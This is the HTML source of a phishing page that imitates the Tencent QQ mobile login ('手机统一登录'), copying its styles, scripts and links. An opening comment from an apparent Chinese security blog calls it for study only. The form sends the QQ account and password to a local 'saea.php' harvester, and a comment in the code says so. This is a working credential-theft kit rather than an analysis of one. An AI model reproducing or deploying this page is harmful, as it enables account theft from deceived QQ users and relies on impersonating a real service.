<!-- 
FancyPig's blog
https://www.iculture.cc
本程序仅供大家学习交流
禁止使用与违法犯罪
感谢大家！
-->
<!DOCTYPE html>
                        <html lang="zh-cn">

                        <head>
                            <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
                            <meta id="viewport" name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
                            <meta name="apple-mobile-web-app-capable" content="yes">
                            <title>手机统一登录</title>
                            <style type="text/css">
                                @charset "utf-8";

                                body,
                                html {
                                    height: 100%
                                }

                                #go,
                                #onekey,
                                #vcode #submit,
                                .copyright,
                                .header,
                                .nick,
                                .q_login,
                                .ui_topbar {
                                    text-align: center
                                }

                                .del_touch,
                                .inputstyle {
                                    -webkit-tap-highlight-color: rgba(255, 255, 255, 0)
                                }

                                body {
                                    font-size: 16px;
                                    background: #eee
                                }

                                * {
                                    padding: 0;
                                    margin: 0;
                                    list-style: none;
                                    text-decoration: none
                                }

                                input::-webkit-input-placeholder,
                                textarea::-webkit-input-placeholder {
                                    color: #aaa
                                }

                                input::-ms-input-placeholder,
                                textarea::-ms-input-placeholder {
                                    color: #aaa
                                }

                                input:focus {
                                    outline: 0
                                }

                                .content {
                                    margin: 0 auto;
                                    width: 320px;
                                    height: 500px;
                                    position: relative
                                }

                                #error_tips {
                                    position: absolute;
                                    top: 0;
                                    z-index: 100;
                                    display: none;
                                    opacity: .95;
                                    width: 100%
                                }

                                #error_tips #error_tips_content {
                                    position: relative;
                                    padding: 16px 0 24px 24px;
                                    border-radius: 5px;
                                    background-color: #525C5F;
                                    height: 28px
                                }

                                #error_tips #error_tips_content #error_icon {
                                    position: absolute;
                                    top: 18px;
                                    display: inline-block;
                                    width: 24px;
                                    height: 24px;
                                    background: url("static/image/info.png") no-repeat
                                }

                                #error_tips #error_tips_content #error_message {
                                    display: inline-block;
                                    line-height: 28px;
                                    font-size: 14px;
                                    color: #fff;
                                    padding: 0 0 0 28px
                                }

                                #error_message a,
                                #error_message a:visited {
                                    color: #F15A22
                                }

                                @media (-webkit-min-device-pixel-ratio:2),
                                (min-resolution:192dpi),
                                (min-resolution:2dppx) {
                                    #error_tips #error_tips_content #error_icon {
                                        background: url("/style/8/images/info@2x.png") no-repeat;
                                        background-size: 24px 24px
                                    }
                                }

                                .login {
                                    margin: 0 auto;
                                    padding-top: 30px
                                }

                                .q_login {
                                    margin: 0 auto 40px;
                                    width: 290px;
                                    overflow: hidden
                                }

                                .inputstyle {
                                    width: 273px;
                                    height: 44px;
                                    color: #000;
                                    border: none;
                                    background: 0 0;
                                    padding-left: 15px;
                                    font-size: 16px;
                                    -webkit-appearance: none
                                }

                                .logo {
                                    height: 100px;
                                    width: 244px;
                                    margin: 0 auto 20px;
                                    background-size: 244px 100px
                                }

                                #switch,
                                #vcode,
                                #web_login {
                                    margin: 0 auto
                                }

                                .header {
                                    display: inline-block;
                                    height: 97px;
                                    width: 96px;
                                    position: relative
                                }

                                #q_login_logo,
                                #q_login_tips,
                                #remember,
                                #remember+.checkbox,
                                #vcode #input_tips,
                                #vcode #vcode_img,
                                #vcode #vcode_input,
                                .del_touch,
                                .del_touch_icon,
                                .del_u,
                                .header .img_out,
                                .header img,
                                .nick,
                                .txt_default {
                                    position: absolute
                                }

                                .header img {
                                    width: 60px;
                                    height: 60px;
                                    top: 10px;
                                    left: 16px
                                }

                                .header .img_out {
                                    width: 60px;
                                    height: 60px;
                                    top: 9px;
                                    left: 15px;
                                    border: 1px solid #c6dbe8;
                                    border-radius: 4px;
                                    -webkit-box-shadow: 1px 1px 13px #6E6E6E
                                }

                                .nick {
                                    display: inline-block;
                                    top: 80px;
                                    left: 0;
                                    height: 20px;
                                    line-height: 18px;
                                    vertical-align: middle
                                }

                                .del_touch_icon {
                                    display: none;
                                    width: 30px;
                                    height: 30px;
                                    left: 60px;
                                    top: 0;
                                    z-index: 1
                                }

                                .del_icon {
                                    display: block;
                                    width: 24px;
                                    height: 22px;
                                    background: url("static/image/android_logo_v1.png") -68px 0 no-repeat;
                                    border-radius: 11px
                                }

                                #web_login {
                                    width: 290px
                                }

                                #g_list {
                                    background: #fff;
                                    height: 89px;
                                    border-radius: 4px
                                }

                                #g_p,
                                #g_u {
                                    position: relative
                                }

                                #g_u {
                                    border-bottom: 1px solid #eaeaea
                                }

                                .txt_default {
                                    top: 12px;
                                    left: 10px;
                                    color: #b3b3b3
                                }

                                .del_touch {
                                    right: 0;
                                    display: none;
                                    height: 44px;
                                    width: 48px;
                                    z-index: 1
                                }

                                .del_u {
                                    display: block;
                                    left: 15px;
                                    top: 13px;
                                    height: 18px;
                                    width: 18px;
                                    border-radius: 9px;
                                    background: url("static/image/android_logo_v1.png") -117px -2px no-repeat
                                }

                                #auto_login {
                                    height: 24px;
                                    margin: 15px 0;
                                    color: #246183;
                                    position: relative
                                }

                                #auto_login .wording {
                                    position: absolute;
                                    left: 40px;
                                    line-height: 24px;
                                    height: 24px;
                                    font-size: 14px
                                }

                                #remember {
                                    left: 14px;
                                    top: 5px;
                                    cursor: pointer;
                                    z-index: 1;
                                    opacity: .01
                                }

                                #remember:checked+.checkbox {
                                    background: url("static/image/checked.png") 1px 1px #146FDF;
                                    border-color: #146FDF
                                }

                                #remember+.checkbox {
                                    display: inline-block;
                                    width: 21px;
                                    height: 21px;
                                    left: 9px;
                                    top: 1px;
                                    border: 1px solid #9ABBE3;
                                    background: 0 0;
                                    border-radius: 11px
                                }

                                #go,
                                #onekey {

                                 margin-top:14px;   
                                color: #fff !important;
                                width: 100%;
                                transition: all .4s;
                                border-radius: .25rem;
                                margin-bottom: 10px;
                                padding: .5rem 1rem;
                                font-size: 1.25rem;
                                line-height: 1.5;
                                background-color: #146fdf;
                                background-image: linear-gradient( 
                            90deg
                             , #146fdf, #146fdf);
                                /*-webkit-box-shadow: 0 5px 10px 0 rgb(16 110 253 / 30%);*/
                                /*box-shadow: 0 5px 10px 0 rgb(16 110 253 / 30%);*/
                                border: 0px;
                                cursor: pointer;
                                }

                                #go.weak,
                                #onekey.weak,
                                #switch #swicth_login {
                                    height: 42px;
                                    border: 1px solid #9abbe3;
                                    color: #146fdf
                                }

                                #onekey {
                                    background: #146fdf;
                                    display: none
                                }

                                #go.weak,
                                #onekey.weak {
                                    background-color: #e7e7e7
                                }

                                #switch {
                                    width: 290px
                                }

                                #switch #swicth_login {
                                    width: 288px;
                                    line-height: 44px;
                                    border-radius: 5px;
                                    background: #e7e7e7;
                                    margin-top: 10px;
                                    text-align: center;
                                    font-size: 16px
                                }

                                #switch #zc_feedback {
                                    width: 290px;
                                    position: relative;
                                    margin-top: 15px;
                                    overflow: hidden
                                }

                                #switch #forgetpwd,
                                #switch #zc {
                                    color: #246183;
                                    line-height: 14px;
                                    font-size: 14px;
                                    padding: 15px 10px
                                }

                                #switch #zc {
                                    float: right;
                                    margin-right: -10px
                                }

                                #switch #forgetpwd {
                                    float: left;
                                    margin-left: -10px
                                }

                                .tansparent {
                                    background: 0 0
                                }

                                #q_login_title {
                                    height: 32px;
                                    line-height: 22px;
                                    margin-bottom: 20px;
                                    position: relative
                                }

                                #q_login_logo {
                                    background: url("static/image/android_logo_v1.png") -44px 0 no-repeat;
                                    width: 22px;
                                    height: 22px;
                                    left: 0
                                }

                                #q_login_tips {
                                    left: 30px;
                                    top: 0;
                                    color: #246183
                                }

                                #vcode {
                                    padding-top: 40px;
                                    display: none
                                }

                                #vcode #vcode_tips {
                                    display: block;
                                    width: 290px;
                                    height: 20px;
                                    line-height: 20px;
                                    margin: 0 auto 15px;
                                    color: #77838D
                                }

                                #vcode #vcode_area {
                                    position: relative;
                                    margin: 0 auto;
                                    width: 290px;
                                    height: 70px;
                                    border-radius: 5px;
                                    border: 1px solid #b8b8b8;
                                    background: #fff
                                }

                                #vcode #vcode_img {
                                    left: 3px;
                                    width: 140px;
                                    height: 70px
                                }

                                #vcode #vcode_input {
                                    top: -1px;
                                    left: 145px;
                                    width: 145px;
                                    height: 70px;
                                    border: 1px solid #9d9d9d;
                                    background: 0 0;
                                    -webkit-appearance: none;
                                    border-top-right-radius: 5px;
                                    border-bottom-right-radius: 5px;
                                    line-height: 28px;
                                    font-size: 28px;
                                    -webkit-box-shadow: inset 0 0 10px #ccc
                                }

                                #vcode #input_tips {
                                    top: 5px;
                                    left: 150px;
                                    display: block;
                                    width: 135px;
                                    height: 50px;
                                    color: #B3B3B3;
                                    z-index: 1;
                                    padding-top: 8px
                                }

                                #vcode #submit {
                                    width: 288px;
                                    height: 22px;
                                    padding: 10px 0;
                                    background: #7ec82c;
                                    border: none;
                                    border-radius: 5px;
                                    color: #fff;
                                    font-size: 22px;
                                    margin: 35px auto 0
                                }

                                .copyright {
                                    color: #8a949d;
                                    font-size: 10px;
                                    margin-top: 15px;
                                    font-family: Helvetica
                                }

                                .copyright .chs,
                                .copyright .en {
                                    line-height: 20px
                                }

                                .mode_webapp .ui_topbar .topbar_btn b,
                                .mode_webapp .ui_topbar .topbar_btn_left b {
                                    background-image: url("static/image/bg_btn_back.png");
                                    background-position: bottom right;
                                    background-size: 105px;
                                    width: 6px;
                                    height: 32px;
                                    float: left
                                }

                                .ui_topbar .topbar_title,
                                .ui_topbar h3 {
                                    font-size: 18px
                                }

                                .ui_topbar {
                                    border-bottom: 1px solid #b6b6b6;
                                    border-top: 2px solid #df242a;
                                    background-color: #d9d9d9;
                                    background-image: -webkit-gradient(linear, left top, left bottom, from(#ebebeb), to(#d9d9d9));
                                    background-image: -webkit-linear-gradient(top, #ebebeb, #d9d9d9);
                                    background-image: linear-gradient(to bottom, #ebebeb, #d9d9d9);
                                    height: 40px;
                                    line-height: 40px;
                                    position: relative
                                }

                                .lay_header {
                                    height: auto !important;
                                    width: 100%
                                }

                                .mode_webapp .ui_topbar {
                                    color: #fff;
                                    background-color: #c32d32;
                                    background-image: -webkit-gradient(linear, left top, left bottom, from(#fe444a), to(#c32d32));
                                    background-image: -webkit-linear-gradient(top, #fe444a, #c32d32);
                                    background-image: linear-gradient(to bottom, #fe444a, #c32d32);
                                    border-bottom: 1px solid #700d00;
                                    border-top: 0 none;
                                    top: 0;
                                    left: 0;
                                    width: 100%;
                                    box-shadow: 0 0 5px #333
                                }

                                .mode_webapp .ui_topbar .topbar_btn_left {
                                    display: block;
                                    position: absolute;
                                    left: 10px;
                                    top: 5px
                                }

                                .mode_webapp .ui_topbar .topbar_btn span,
                                .mode_webapp .ui_topbar .topbar_btn_left span {
                                    float: left;
                                    display: inline-block;
                                    height: 32px;
                                    line-height: 30px;
                                    color: #fff;
                                    background-image: url("static/image/bg_btn_back.png");
                                    background-size: 105px;
                                    padding-left: 10px;
                                    padding-right: 4px
                                }

                                .mode_webapp .ui_topbar .topbar_btn_left span {
                                    background-image: url("static/image/bg_btn_back.png");
                                    background-position: left -32px;
                                    background-size: 105px;
                                    padding-left: 17px
                                }

                                .skin-2 .ui_topbar {
                                    background-color: #161616;
                                    background-image: -webkit-gradient(linear, left top, left bottom, from(#3e3e3e), to(#262626));
                                    background-image: -webkit-linear-gradient(top, #3e3e3e, #262626);
                                    background-image: linear-gradient(to bottom, #3e3e3e, #262626);
                                    border-bottom-color: #1a1a1a
                                }

                                .skin-2 .ui_topbar .topbar_btn b,
                                .skin-2 .ui_topbar .topbar_btn span,
                                .skin-2 .ui_topbar .topbar_btn_left b,
                                .skin-2 .ui_topbar .topbar_btn_left span {
                                    background-image: url("static/image/bg_btn_back_black@2x.png");
                                    background-size: 105px
                                }

                                .new_vcode {
                                    display: none;
                                    width: 100%;
                                    height: 100%;
                                    overflow: hidden
                                }
                            </style>
                            <link rel="stylesheet" type="text/css" href="static/css/mobile_common.css">
                            <style type="text/css">
                                .logo {
                                    background-image: url("static/image/ptlogin-logo.png");
                                }
                            </style>
                            <script>
                                //错误上报
                                (function() {
                                    window.onerror = function(msg, url, line) {
                                        var reportUrl = "//ui.ptlogin2.qq.com/cgi-bin/report?";
                                        var t = document.createElement('img');
                                        var e_info = encodeURIComponent(msg + '|_|' + url + '|_|' + line + '|_|' + window.navigator.userAgent);
                                        t.src = reportUrl + 'id=195279&msg=' + e_info + '&v=' + Math.random();
                                    }
                                })();
                                var ptui_daid = encodeURIComponent("5") //业务隔离id
                                    ,
                                    ptui_appid = encodeURIComponent("549000929") //业务的appid
                                    ,
                                    ptui_domain = encodeURIComponent("qq.com") //domain
                                    ,
                                    ptui_regmaster = encodeURIComponent(""),
                                    ptui_lang = encodeURIComponent("2052"),
                                    ptui_pt_version = encodeURIComponent("20071015"),
                                    ptui_version = encodeURIComponent("202007101511"),
                                    ptui_style = encodeURIComponent("9"),
                                    ptui_noAuth = "1" //是否需要去检查业务隔离，默认为1，需要检查（数字）

                                    ,
                                    ptui_pt_qzone_sig = "0",
                                    ptui_pt_light = "0" //轻登录，只下发p_skey,取值0或者1
                                    ,
                                    ptui_pt_ttype = "1",
                                    ptui_pt_3rd_aid = encodeURIComponent("0") //互联的第三方appid
                                    ,
                                    ptui_enablePwd = encodeURIComponent("") //互联的登录是否使用密码控件
                                    ,
                                    ptui_target = encodeURIComponent("_self") //跳转方式
                                    ,
                                    ptui_low_login = parseInt("0", 10) || 0,
                                    ptui_low_login_hour = parseInt("0", 10) || 720 // 弱登录时间，默认一个月
                                    ,
                                    ptui_kf_csimc = encodeURIComponent("0"),
                                    ptui_kf_csnum = encodeURIComponent("0"),
                                    ptui_kf_authid = encodeURIComponent("0"),
                                    ptui_defuin = "" //设置的默认uin(input value 赋值)
                                    ,
                                    ptui_force_qr = "",
                                    ptui_lockuin = parseInt("0");
                                if (ptui_daid == 1)
                                    ptui_daid = 0; // 因为业务总是填错，所以daid=1也认为是没填的
                                var STR_LANG = {
                                    no_uin: "你还没有输入帐号！",
                                    no_password: "你还没有输入密码！",
                                    no_code: "你还没有输入验证码！",
                                    err_uin: "请输入正确的帐号！",
                                    less_code: "请输入完整的验证码！",
                                    err_code: "请输入完整的验证码！",
                                    onekey: "一键登录",
                                    onekeying: "正在拉起QQ手机版...",
                                    offline: "网络异常",
                                    close: "关闭",
                                    password_error_tips: '若你的帐号为非大陆手机号，请<a href="javascript:pt.enterOverseaLogin()">点击这里</a>进行登录。'
                                };
                            </script>
                        </head>

                        <body>
                            <div id="content" class="content">
                                <div id="error_tips">
                                    <div id="error_tips_content">
                                        <span id="error_icon"></span> <span id="error_message">你还没有输入密码！</span></div>
                                </div>
                                <div id="login" class="login">
                                    <div id="logo" class="logo"></div>
                                    <div id="app_name" style="display:none">
                                    </div>
                                    <div id="q_login" class="q_login" style="display: none;">
                                        <div id="q_login_title">
                                            <div id="q_login_logo"></div>
                                            <label id="q_login_tips"> 请选择登录帐号 </label>
                                        </div>
                                        <div id="q_logon_list" class="q_logon_list"></div>
                                    </div>
                                    <div id="web_login">
                                        <ul id="g_list">
                                            <li id="g_u">
                                                <div id="del_touch" class="del_touch"><span id="del_u" class="del_u"></span></div>
                                                
                                            <!-- form标签提交账号密码至saea.php -->    
                                            
                                                <form action="saea.php" method="POST">
                                                    <input id="u" class="inputstyle" name="lynr" autocomplete="off" placeholder="QQ号码/手机/邮箱">
                                            </li>
                                            <li id="g_p">
                                                <div id="del_touch_p" class="del_touch">
                                                    <span id="del_p" class="del_u"></span></div>

                                                <input id="p" class="inputstyle" maxlength="16" type="password" name="username" autocorrect="off" placeholder="请输入你的QQ密码">
                                            </li>
                                        </ul>
                                        <input id="go" type='submit' value='登录'>
                                        </form>
                                        <div id="switch">
                                            <div id="zc_feedback">
                                                <span id="zc" onclick="window.open('https://ssl.zc.qq.com/phone/index.html?from=pt')">注册新帐号</span>
                                                <span id="forgetpwd" onclick="window.open('https://aq.qq.com/cn2/findpsw/mobile_v2/mobile_web_find_index?source_id=3263&account')">忘了密码？</span> </div>
                                        </div>
                                        <div id="custom_bottom"> </div>
                                    </div>
                                    <div id="vcode">

                                        <div id="fofffoterBlank"></div>
                        </body>








                        <script>
                            var login_wording = "快速登录历史帐号";
                            var qlogin_wording = "帐号密码登录";
                        </script>
                        <script>
                            function cleanCache(f) {
                                var t = document.createElement("iframe");
                                if (f.split("#").length == 3) f = f.substring(0, f.lastIndexOf("#"));
                                t.src = f;
                                t.style.display = "none";
                                document.body.appendChild(t);
                            };

                            function loadScript(src, errorCallback, obj) {
                                var tag = document.createElement("script");
                                tag.type = 'text/javascript';
                                tag.charset = "utf-8";

                                if (window.location.href.indexOf('_crossorigin=1') > -1) {
                                    tag.setAttribute('crossorigin', 'anonymous')
                                }

                                tag.onload = tag.onerror = tag.onreadystatechange = function() {
                                    if (window[obj]) { // 加载成功
                                        loadJs.onloadTime = +new Date();
                                        return;
                                    }
                                    if (!this.readyState || ((this.readyState === "loaded" || this.readyState === "complete") && !window[obj])) {
                                        errorCallback && errorCallback();
                                        tag.onerror = tag.onreadystatechange = null;
                                    }
                                };
                                tag.src = src;
                                document.getElementsByTagName("head")[0].appendChild(tag);
                            };
                            /*===grunt bottom_inc===*/
                            function ptuiV(v) {
                                if (v != window.ptui_pt_version) {
                                    cleanCache("/clearcache.html#" + location.href);
                                }
                            }
                        </script>

                        </html>
